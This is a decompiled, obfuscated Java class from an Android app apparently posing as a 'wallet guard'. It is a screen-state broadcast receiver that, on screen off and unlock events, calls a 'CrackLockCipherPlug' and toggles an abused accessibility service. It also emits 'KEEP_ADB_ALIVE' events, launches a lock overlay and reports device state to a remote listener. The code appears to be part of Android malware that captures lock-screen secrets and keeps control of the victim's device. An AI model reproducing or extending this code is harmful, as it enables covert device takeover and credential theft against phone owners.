package com.guard.wallet.receiver;

import a1.AbstractC0026q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.AbstractC0181d;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.helper.AbstractC0195r;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import com.guard.wallet.utils.C0253i;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/* loaded from: classes.dex */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    /* renamed from: b */
    public static final C0253i f283b = new C0253i(1);

    /* renamed from: a */
    public final AtomicInteger f284a = new AtomicInteger(1);

    /* renamed from: a */
    public static void m458a(int i2) {
        try {
            String m708l = AbstractC0252h.m708l("lockSubscribeId");
            if (!AbstractC0026q.m151B(m708l)) {
                AbstractC0207l.m425h(new ReqListenHelper(m708l, Integer.valueOf(i2)));
                AbstractC0252h.m719w("lockSubscribeId");
            }
            boolean z2 = true;
            if (AbstractC0195r.m382k()) {
                AbstractC0195r.m378g(i2 == 4);
            }
            if (i2 != 4) {
                z2 = false;
            }
            AbstractC0192o.m365f(null, z2);
        } catch (Exception e2) {
            AbstractC0026q.m186s("ScreenBroadcastReceiver", e2);
        }
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        char c;
        try {
            int i2 = 1;
            this.f284a.set(1);
            if (intent == null || AbstractC0026q.m151B(intent.getAction())) {
                return;
            }
            String action = intent.getAction();
            switch (action.hashCode()) {
                case -2128145023:
                    if (action.equals("android.intent.action.SCREEN_OFF")) {
                        c = 0;
                        break;
                    }
                    c = 65535;
                    break;
                case -1454123155:
                    if (action.equals("android.intent.action.SCREEN_ON")) {
                        c = 1;
                        break;
                    }
                    c = 65535;
                    break;
                case 244891622:
                    if (action.equals("android.intent.action.DREAMING_STARTED")) {
                        c = 2;
                        break;
                    }
                    c = 65535;
                    break;
                case 257757490:
                    if (action.equals("android.intent.action.DREAMING_STOPPED")) {
                        c = 3;
                        break;
                    }
                    c = 65535;
                    break;
                case 823795052:
                    if (action.equals("android.intent.action.USER_PRESENT")) {
                        c = 4;
                        break;
                    }
                    c = 65535;
                    break;
                default:
                    c = 65535;
                    break;
            }
            if (c == 0) {
                Log.d("ScreenBroadcastReceiver", "手机息屏了");
                m458a(0);
                if (MyAccessibilityService.m554P() != null) {
                    if (MyAccessibilityService.m554P().m529j()) {
                        MyAccessibilityService.f321q.set(true);
                        Log.d("ScreenBroadcastReceiver", "stopLocalAccessibilityDelegate");
                        MyAccessibilityService.m554P().m519D();
                    }
                    MyAccessibilityService.m554P().m559H(true, false);
                }
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_OFF");
                    if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                        MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                        C0224c.m450f();
                    }
                }
                AbstractC0181d.m345a();
                AbstractC0252h.m719w("lockBatchId");
                i2 = 0;
            } else if (c == 1) {
                Log.d("ScreenBroadcastReceiver", "手机亮屏了");
                if (MainApplication.getInstance() != null) {
                    MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_ON");
                }
                if (AbstractC0251g.p0()) {
                    AbstractC0252h.m683D(Long.valueOf(f283b.m723a()), "lockBatchId");
                }
            } else if (c == 2) {
                Log.d("ScreenBroadcastReceiver", "手机开启屏保、进入休眠");
                i2 = 2;
            } else if (c == 3) {
                Log.d("ScreenBroadcastReceiver", "手机停止屏保、退出休眠");
                i2 = 3;
            } else if (c != 4) {
                i2 = -1;
            } else {
                Log.d("ScreenBroadcastReceiver", "手机解锁了");
                if (MainApplication.getInstance() != null) {
                    if (!MainApplication.getInstance().isUserUnlockedInstance()) {
                        MainApplication.getInstance().unlockedInstance();
                    }
                    if (MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                        MainApplication.getInstance().getCrackLockCipherPlug().getClass();
                        C0224c.m451g();
                    }
                    MainApplication.getInstance().offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
                }
                m458a(4);
                AtomicBoolean atomicBoolean = MyAccessibilityService.f321q;
                if (atomicBoolean.get()) {
                    atomicBoolean.set(false);
                    AbstractC0251g.F0(2);
                }
                i2 = 4;
            }
            if (!Objects.equals(0, Integer.valueOf(i2))) {
                LockActivity.m330a();
            }
            AbstractC0252h.m683D(Integer.valueOf(i2), "screenState");
            AbstractC0252h.m687H(i2, intent.getAction());
        } catch (Exception e2) {
            AbstractC0026q.m186s("ScreenBroadcastReceiver", e2);
        }
    }
}
